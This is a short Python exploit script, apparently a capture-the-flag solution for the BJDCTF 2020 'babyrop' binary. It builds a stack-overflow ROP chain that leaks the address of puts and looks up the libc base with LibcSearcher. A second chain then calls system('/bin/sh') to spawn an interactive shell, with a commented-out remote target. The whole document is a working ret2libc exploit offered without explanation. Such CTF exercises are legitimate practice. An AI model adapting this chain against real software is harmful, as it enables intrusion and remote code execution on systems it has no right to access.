from pwn import *
from LibcSearcher import LibcSearcher
io = gdb.debug('./bjdctf_2020_babyrop')

#io = process('./bjdctf_2020_babyrop')
#io = remote('node4.buuoj.cn',29488)
elf = ELF('./bjdctf_2020_babyrop')
payload1 = b'A'*0x28+p64(0x0000000000400733)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])
io.sendlineafter(b'Pull up your sword and tell me u story!\n',payload1)
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print('puts_addr->',hex(puts_addr))

Lib = LibcSearcher('puts',puts_addr)
baseoffset = puts_addr - Lib.dump('puts')
sys_addr = baseoffset + Lib.dump('system')
bin_sh_addr = baseoffset + Lib.dump('str_bin_sh')

payload2 = b'A'*0x28+p64(0x0000000000400733)+p64(bin_sh_addr)+p64(sys_addr)
io.sendlineafter(b'Pull up your sword and tell me u story!\n',payload2)
io.interactive()
